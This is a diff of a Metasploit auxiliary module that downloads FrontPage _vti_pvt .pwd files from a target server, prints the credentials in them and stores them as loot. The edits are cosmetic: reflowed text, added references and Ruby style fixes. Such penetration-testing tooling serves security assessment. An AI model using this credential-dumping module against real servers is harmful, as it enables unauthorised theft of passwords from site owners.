@@ -12,11 +12,14 @@ class MetasploitModule < Msf::Auxiliary
     super(update_info(info,
       'Name'           => 'FrontPage .pwd File Credential Dump',
       'Description'    => %q{
-          This module downloads and parses the '_vti_pvt/service.pwd', '_vti_pvt/administrators.pwd', and '_vti_pvt/authors.pwd' files
-       on a FrontPage server to find credentials.
+        This module downloads and parses the '_vti_pvt/service.pwd', 
+        '_vti_pvt/administrators.pwd', and '_vti_pvt/authors.pwd' files on a FrontPage
+         server to find credentials.
       },
       'References'     =>
         [
+          [ 'URL', 'https://packetstormsecurity.com/files/11556/cgi-check99v4.r.html'],
+          [ 'URL', 'https://insecure.org/sploits/Microsoft.frontpage.insecurities.html'],
           [ 'URL', 'http://sparty.secniche.org/' ]
         ],
       'Author'         =>
@@ -65,7 +68,7 @@ class MetasploitModule < Msf::Auxiliary
     files.each do |filename|
       contents = get_pass_file(filename)
 
-      next if contents == nil
+      next if contents.nil?
 
       print_good("#{ip} - #{filename}")
 
@@ -73,7 +76,7 @@ class MetasploitModule < Msf::Auxiliary
         print_good(line.chomp)
       end
 
-      print_line()
+      print_line
 
       store_loot("frontpage.pwd.file", "text/plain", ip, contents, filename)
     end
